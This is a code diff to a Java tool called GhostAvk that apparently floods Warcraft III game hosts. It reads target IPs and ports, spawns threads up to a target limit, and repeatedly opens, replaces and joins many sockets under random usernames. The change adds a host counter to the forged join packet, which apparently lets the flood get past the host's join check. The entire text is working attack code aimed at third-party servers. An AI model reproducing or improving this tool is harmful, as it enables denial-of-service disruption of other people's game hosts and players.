@@ -48,13 +48,14 @@ public class GhostAvk {
 					String[] parts = line.split("\\|");
 					String ip = parts[3];
 					int port = Integer.parseInt(parts[4]);
+					int hostCounter = Integer.parseInt(parts[5]);
 					String ipport = ip + port;
 					
 					synchronized(map) {
 						if(!map.containsKey(ipport) && numTargets < MAX_TARGETS) {
 							map.put(ipport, true);
 							numTargets++;
-							AvkThread athread = new AvkThread(ip, port);
+							AvkThread athread = new AvkThread(ip, port, hostCounter);
 							athread.start();
 						}
 					}
@@ -83,6 +84,7 @@ class AvkThread extends Thread {
 	String targetAddressString;
 	InetAddress targetAddress;
 	int targetPort;
+	int hostCounter;
 	
 	Socket socket = null;
 	DataInputStream in;
@@ -90,7 +92,7 @@ class AvkThread extends Thread {
 	
 	ArrayList<AvkSocket> sockets;
 
-	public AvkThread(String targetAddressString, int targetPort) {
+	public AvkThread(String targetAddressString, int targetPort, int hostCounter) {
 		try {
 			this.targetAddress = InetAddress.getByName(targetAddressString);
 		} catch(Exception e) {
@@ -99,6 +101,7 @@ class AvkThread extends Thread {
 		
 		this.targetAddressString = targetAddressString;
 		this.targetPort = targetPort;
+		this.hostCounter = hostCounter;
 		sockets = new ArrayList<AvkSocket>();
 	}
 	
@@ -112,7 +115,7 @@ class AvkThread extends Thread {
 			log("init: Adding new socket (sockets.size=" + sockets.size() + ")");
 			AvkSocket socket = new AvkSocket();
 			
-			if(!socket.startConnect(targetAddress, targetPort, GhostAvk.RANDOM.nextString())) {
+			if(!socket.startConnect(targetAddress, targetPort, hostCounter, GhostAvk.RANDOM.nextString())) {
 				log("Host seems down; returning");
 				GhostAvk.deleteFromMap(targetAddressString + targetPort);
 				return; //host is down...
@@ -144,7 +147,7 @@ class AvkThread extends Thread {
 				log("Adding new socket (sockets.size=" + sockets.size() + ")");
 				AvkSocket socket = new AvkSocket();
 			
-				if(!socket.startConnect(targetAddress, targetPort, GhostAvk.RANDOM.nextString())) {
+				if(!socket.startConnect(targetAddress, targetPort, hostCounter, GhostAvk.RANDOM.nextString())) {
 					log("Host seems down; returning");
 					GhostAvk.deleteFromMap(targetAddressString + targetPort);
 					return; //host is down...
@@ -166,7 +169,7 @@ class AvkThread extends Thread {
 					log("Replacing old socket: " + i);
 					AvkSocket socket = new AvkSocket();
 					
-					if(!socket.startConnect(targetAddress, targetPort, GhostAvk.RANDOM.nextString())) {
+					if(!socket.startConnect(targetAddress, targetPort, hostCounter, GhostAvk.RANDOM.nextString())) {
 						log("Host seems down; returning");
 						GhostAvk.deleteFromMap(targetAddressString + targetPort);
 						return; //host is down...
@@ -212,7 +215,7 @@ class AvkSocket extends Thread {
 	}
 	
 	//code ported from deny patch on codelain
-	public boolean startConnect(InetAddress targetAddress, int targetPort, String username) {
+	public boolean startConnect(InetAddress targetAddress, int targetPort, int hostCounter, String username) {
 		try {
 			byte b1 = 1;
 			byte b2 = 20;
@@ -228,10 +231,7 @@ class AvkSocket extends Thread {
 			buf.put((byte) 247); //header constant
 			buf.put((byte) 30); //reqjoin header
 			buf.putShort((short) (30 + username_bytes.length)); // packet length
-			buf.put((byte) b1);
-			buf.put((byte) 0);
-			buf.put((byte) 0);
-			buf.put((byte) b2);
+			buf.putInt(hostCounter);
 			buf.putInt(0); //entry key
 			buf.put((byte) 0); //unknown
 			buf.putShort((short) 6112); //listen port
@@ -338,7 +338,7 @@ class AvkSocket extends Thread {
 	public void sendMessage(String message) throws IOException {
 		byte[] message_bytes = message.getBytes();
 		
-		ByteBuffer buf = ByteBuffer.allocate(26 + message_bytes.length);
+		ByteBuffer buf = ByteBuffer.allocate(22 + message_bytes.length);
 		buf.order(ByteOrder.LITTLE_ENDIAN);
 		buf.put((byte) 247); //header constant
 		buf.put((byte) 40); //chat to host header
